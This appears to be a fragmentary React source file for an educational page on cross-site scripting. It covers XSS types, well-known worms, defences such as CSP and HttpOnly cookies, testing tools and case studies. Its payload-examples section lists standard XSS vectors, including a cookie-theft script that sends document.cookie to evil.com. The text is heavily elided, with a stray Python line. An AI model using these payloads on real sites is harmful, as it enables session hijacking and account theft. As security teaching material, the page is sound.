        ...
        <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
          <div className="flex items-center gap-4 mb-8">
            ...
            <div className="flex-1">
              ...
              <p className="text-cyan-300 mt-2">Understand how attackers inject malicious scripts into trusted websites</p>
            </div>
            {onStartChallenge && (
              <button
...
const TheoryTab = () => (
  <div className="space-y-8">
    <section>
      ...
      <div className="bg-white/5 rounded-lg p-6 space-y-4">
        ...
        <div className="bg-orange-500/20 border border-orange-500/50 rounded-lg p-4">
          <p className="text-sm font-semibold mb-2">OWASP Classification</p>
    ...
    <section>
      <h2 className="text-2xl font-bold mb-4">Three Types of XSS Attacks</h2>
    ...
    <section>
      <h2 className="text-2xl font-bold mb-4">Attack Scenarios and Impact</h2>
      ...
      <div className="bg-red-500/20 border-l-4 border-red-500 rounded-lg p-6">
        <div className="flex items-start gap-4">
          ...
          <div className="space-y-3">
            <h3 className="text-xl font-semibold">Self-Propagating XSS Worm</h3>
            <p className="text-gray-200 leading-relaxed">
            ...
            <div className="bg-black/30 rounded-lg p-4 mt-4">
              <p className="text-sm font-semibold mb-2 text-cyan-400">Attack Payload:</p>
    ...
    <section>
      ...
      <div className="bg-orange-500/20 border-l-4 border-orange-500 rounded-lg p-6">
        <div className="flex items-start gap-4">
          ...
          <div className="space-y-3">
            <h3 className="text-xl font-semibold">Fastest Spreading Virus in History</h3>
            <p className="text-gray-200 leading-relaxed">
            ...
            <div className="bg-black/30 rounded-lg p-4 mt-4">
              <p className="text-sm font-semibold mb-2 text-cyan-400">Impact:</p>
    ...
    <section>
      <h2 className="text-2xl font-bold mb-4">XSS Attack Methodology</h2>
        ...
        <ol className="space-y-4">
          {[
            ...
            <li key={item.step} className="flex gap-4">
              <div className="flex-shrink-0 w-8 h-8 bg-cyan-500 rounded-full flex items-center justify-center font-bold">
                {item.step}
              </div>
              <div>
...
// Attack: /?name=<img src=x onerror="alert(document.cookie)">`}</code>
    ...
    <section>
      <h2 className="text-2xl font-bold mb-4">XSS Payload Examples</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-white/5 rounded-lg p-4">
          <h4 className="font-semibold mb-2">Basic Alert</h4>
          <div className="bg-black/50 rounded p-2 font-mono text-xs">
            <code className="text-green-400">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
          </div>
        </div>

        <div className="bg-white/5 rounded-lg p-4">
          <h4 className="font-semibold mb-2">Image Tag with onerror</h4>
          <div className="bg-black/50 rounded p-2 font-mono text-xs">
            <code className="text-green-400">&lt;img src=x onerror="alert(1)"&gt;</code>
          </div>
        </div>

        <div className="bg-white/5 rounded-lg p-4">
          <h4 className="font-semibold mb-2">Cookie Theft</h4>
          <div className="bg-black/50 rounded p-2 font-mono text-xs">
            <code className="text-green-400">&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code>
          </div>
        </div>

        <div className="bg-white/5 rounded-lg p-4">
          <h4 className="font-semibold mb-2">JavaScript Protocol</h4>
          <div className="bg-black/50 rounded p-2 font-mono text-xs">
            <code className="text-green-400">&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</code>
          </div>
        </div>

        <div className="bg-white/5 rounded-lg p-4">
          <h4 className="font-semibold mb-2">Event Handler</h4>
          <div className="bg-black/50 rounded p-2 font-mono text-xs">
            <code className="text-green-400">&lt;body onload="alert(1)"&gt;</code>
          </div>
        </div>

        <div className="bg-white/5 rounded-lg p-4">
          <h4 className="font-semibold mb-2">SVG Attack</h4>
          <div className="bg-black/50 rounded p-2 font-mono text-xs">
            <code className="text-green-400">&lt;svg onload="alert(1)"&gt;</code>
          </div>
        </div>
      </div>
    </section>
...
def search():
    ...
    <section>
      <h2 className="text-2xl font-bold mb-4">Content Security Policy Implementation</h2>
      <div className="bg-white/5 rounded-lg p-6 space-y-4">
        <p className="text-gray-200">
        ...
        <div>
          <h4 className="font-semibold mb-2 text-cyan-400">Strict CSP Header (Recommended)</h4>
        ...
        <div>
          <h4 className="font-semibold mb-2 text-cyan-400">Node.js/Express Implementation</h4>
...
app.use(helmet.contentSecurityPolicy({
  directives: {
    ...
    upgradeInsecureRequests: []
        ...
        <div>
          <h4 className="font-semibold mb-2 text-cyan-400">Apache .htaccess</h4>
          <div className="bg-black/50 rounded p-3 font-mono text-sm">
            <code className="text-green-400">
    ...
    <section>
      <h2 className="text-2xl font-bold mb-4">HttpOnly and Secure Cookie Flags</h2>
      <div className="bg-white/5 rounded-lg p-6 space-y-4">
        <p className="text-gray-200">
        ...
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <h4 className="font-semibold mb-2 text-cyan-400">PHP</h4>
          ...
          <div>
            <h4 className="font-semibold mb-2 text-cyan-400">Node.js/Express</h4>
            <div className="bg-black/50 rounded p-3 font-mono text-xs">
              <code className="text-gray-300">
      ...
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="bg-gradient-to-br from-red-500/20 to-orange-500/20 border border-red-500/50 rounded-lg p-6">
          <div className="flex items-start gap-4">
            ...
            <div>
              <h3 className="text-xl font-semibold mb-2">XSStrike</h3>
        ...
        <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 border border-purple-500/50 rounded-lg p-6">
          <div className="flex items-start gap-4">
            ...
            <div>
              <h3 className="text-xl font-semibold mb-2">BeEF (Browser Exploitation Framework)</h3>
              <p className="text-sm text-gray-300 mb-3">
        ...
        <div className="bg-gradient-to-br from-blue-500/20 to-cyan-500/20 border border-blue-500/50 rounded-lg p-6">
          <div className="flex items-start gap-4">
            <Code className="w-8 h-8 text-blue-400 flex-shrink-0" />
            <div>
              <h3 className="text-xl font-semibold mb-2">Burp Suite Scanner</h3>
              <p className="text-sm text-gray-300 mb-3">
                Professional web vulnerability scanner with comprehensive XSS detection capabilities.
              </p>
              <div className="space-y-2 text-sm">
                <p className="font-semibold text-cyan-400">XSS Testing Features:</p>
                <ul className="list-disc list-inside space-y-1 text-gray-300">
        ...
        <div className="bg-gradient-to-br from-orange-500/20 to-red-500/20 border border-orange-500/50 rounded-lg p-6">
          <div className="flex items-start gap-4">
            ...
            <div>
              <h3 className="text-xl font-semibold mb-2">XSSer</h3>
              <p className="text-sm text-gray-300 mb-3">
    ...
    <section>
      ...
      <div className="space-y-6">
        <div className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 border border-green-500/50 rounded-lg p-6">
          ...
          <div className="bg-black/50 rounded p-4 font-mono text-sm mb-4">
            <code className="text-gray-300">
        ...
        <div className="bg-gradient-to-br from-blue-500/20 to-indigo-500/20 border border-blue-500/50 rounded-lg p-6">
          <h3 className="text-xl font-semibold mb-3">Content Security Policy (CSP)</h3>
          <p className="text-gray-200 mb-4">
            HTTP response header that helps prevent XSS by controlling which resources can be loaded.
          </p>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-sm font-semibold mb-2 text-cyan-400">CSP Benefits:</p>
        ...
        <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 border border-purple-500/50 rounded-lg p-6">
          ...
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-white/5 rounded p-3">
              ...
              <p className="text-xs text-gray-300">Open-source WAF with OWASP Core Rule Set</p>
            </div>
            <div className="bg-white/5 rounded p-3">
              <p className="font-semibold mb-1">Cloudflare WAF</p>
              <p className="text-xs text-gray-300">Cloud-based XSS protection with managed rules</p>
            </div>
            <div className="bg-white/5 rounded p-3">
              <p className="font-semibold mb-1">AWS WAF</p>
              <p className="text-xs text-gray-300">Customizable XSS filtering rules</p>
            </div>
          </div>
        </div>

        <div className="bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border border-cyan-500/50 rounded-lg p-6">
          <h3 className="text-xl font-semibold mb-3">Secure Coding Frameworks</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-sm font-semibold mb-2 text-cyan-400">Auto-Escaping Templating:</p>
              <ul className="list-disc list-inside space-y-1 text-sm text-gray-300">
            ...
            <div>
              <p className="text-sm font-semibold mb-2 text-cyan-400">Security Headers:</p>
              <ul className="list-disc list-inside space-y-1 text-sm text-gray-300">
    ...
    <section>
      ...
      <div className="space-y-4">
        ...
        >
          ...
          <p className="text-xs text-cyan-400">https://owasp.org/www-community/attacks/xss/</p>
        </a>
        ...
        >
          ...
          <p className="text-xs text-green-400">https://portswigger.net/web-security/cross-site-scripting</p>
        </a>
        ...
        <a
          ...
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-gradient-to-br from-orange-500/20 to-red-500/20 border border-orange-500/50 rounded-lg p-5 hover:border-orange-400 transition-all"
        >
          <h3 className="text-xl font-semibold mb-2 flex items-center gap-2">
      ...
      <div className="space-y-4">
        <div className="bg-gradient-to-br from-red-500/20 to-orange-500/20 border border-red-500/50 rounded-lg p-5">
          ...
          <div className="bg-black/30 rounded p-4 mb-3">
            <p className="text-xs font-semibold mb-2 text-cyan-400">Key Lessons:</p>
        ...
        <div className="bg-gradient-to-br from-orange-500/20 to-yellow-500/20 border border-orange-500/50 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2">Twitter XSS Worm (2010)</h3>
          <p className="text-sm text-gray-300 mb-3">
        ...
        <div className="bg-gradient-to-br from-yellow-500/20 to-orange-500/20 border border-yellow-500/50 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2">British Airways XSS (2018)</h3>
          <p className="text-sm text-gray-300 mb-3">
        ...
        <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 border border-purple-500/50 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2">eBay Persistent XSS (2015-2016)</h3>
          <p className="text-sm text-gray-300 mb-3">
      ...
      <div className="space-y-3">
        <div className="bg-white/5 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold">XSS Filter Evasion Cheat Sheet</p>
              <p className="text-sm text-gray-400">Comprehensive collection of XSS vectors and bypass techniques</p>
            </div>
            <a
              href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet"
              target="_blank"
              rel="noopener noreferrer"
              className="px-4 py-2 bg-cyan-500/20 hover:bg-cyan-500/30 rounded text-sm transition-all"
            >
              Visit
            </a>
          </div>
        ...
        <div className="bg-white/5 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold">DOMPurify GitHub Repository</p>
              <p className="text-sm text-gray-400">Industry-standard XSS sanitization library</p>
            </div>
            <a
        ...
        <div className="bg-white/5 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold">PayloadsAllTheThings - XSS</p>
              <p className="text-sm text-gray-400">Extensive XSS payload collection and exploitation techniques</p>
            </div>
            <a
        ...
        <div className="bg-white/5 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold">XSStrike Tool Documentation</p>
              <p className="text-sm text-gray-400">Advanced XSS detection and exploitation framework</p>
            </div>
            <a
    ...
    <section>
      ...
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border border-cyan-500/50 rounded-lg p-5">
          ...
          <span className="text-xs text-cyan-400">Free • Interactive • Hands-On</span>
        </div>
        ...
        <div className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 border border-green-500/50 rounded-lg p-5">
          ...
          <span className="text-xs text-green-400">Open Source • Local Setup</span>
        </div>

        <div className="bg-gradient-to-br from-orange-500/20 to-red-500/20 border border-orange-500/50 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-2">XSS Game by Google</h3>
          <p className="text-sm text-gray-300 mb-2">
